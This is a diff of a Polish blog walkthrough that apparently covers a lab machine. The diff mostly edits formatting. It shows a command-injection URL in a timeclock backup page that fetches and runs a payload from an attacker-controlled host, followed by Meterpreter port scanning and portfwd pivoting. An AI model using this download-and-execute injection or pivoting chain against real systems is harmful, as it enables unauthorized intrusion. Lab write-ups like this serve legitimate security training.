@@ -138,6 +138,7 @@ wget%20-qO%20o6OY7FJX%20--no-check-certificate%20http%3A%2F%2F172.16.1.10%3A8080
 </div>
 <div class="notice--primary" markdown="1">
 Całość, czyli link+komenda wklejamy do przeglądarki:
+
 http://172.16.1.167:8115//timeclock/backup/browse_backups.php?cmd=wget%20-qO%20o6OY7FJX%20--no-check-certificate%20http%3A%2F%2F172.16.1.10%3A8080%2FL495CA%3B%20chmod%20%2Bx%20o6OY7FJX%3B%20.%2Fo6OY7FJX%26%20disown
 {: .notice--info}
 </div>
@@ -160,7 +161,7 @@ Active sessions
                                    .31.10.17
 
 ```
-Jeżeli weszliśmy na konsole (session 1) **Meterpretera**, możemy zamknąć przeglądarkę. Kod eksploita już tam siedzi :smiley: Dzięki komendzie *arp* możemy zobaczyć "skeszowane" arpy.
+Jeżeli weszliśmy na konsole (session 1) **Meterpretera**, możemy zamknąć przeglądarkę. Kod eksploita już tam siedzi. :smiley: Dzięki komendzie *arp* możemy zobaczyć "skeszowane" arpy.
 {: .text-justify}
 ```
 msf6 exploit(multi/script/web_delivery) > sessions 1
@@ -204,9 +205,11 @@ msf6 exploit(multi/script/web_delivery) >
 Teraz możemy skanować serwery z naszego komputera, które widzi tylko serwer 172.16.1.167:
 {: .text-justify}
 <div class="notice--primary" markdown="1">
+```console
 use  auxiliary/scanner/portscan/tcp
 set rhosts 172.31.20.194
 run -j
+```
 ```console
 msf6 auxiliary(scanner/portscan/tcp) > use  auxiliary/scanner/portscan/tcp
 msf6 auxiliary(scanner/portscan/tcp) > set rhosts 172.31.20.194
@@ -217,12 +220,18 @@ msf6 auxiliary(scanner/portscan/tcp) >
 [+] 172.31.20.194:        - 172.31.20.194:24 - TCP OPEN
 ```
 </div>
-
-Jak widzimy jest otwarty port **24** na ip **172.31.20.194**.
+Jak widzimy, jest otwarty port **24** na ip **172.31.20.194**.
 {: .text-justify}
 # Pivoting
 Teraz możemy przekierować cały ruch z **172.31.20.194**, a dokładniej jeden port na naszą lokalną maszynę:
 {: .text-justify}
+<div class="notice--primary" markdown="1">
+```console
+sessions 1
+portfwd add -l 24 -p 24 -r 172.31.20.194
+portfwd
+```
+</div>
 ```console
 msf6 auxiliary(scanner/portscan/tcp) > sessions 1
 [*] Starting interaction with 1...
@@ -257,7 +266,6 @@ tcp            LISTEN          0               244                              
 ```
 Widać, że połączanie na 24 porcie jest. Teraz sprawdźmy co się tam kryje:
 {: .text-justify}
-
 ## SSH
 ```console
 root@kali:/home/szikers/myhouse7-1# nmap -sV -p 24 127.0.0.1
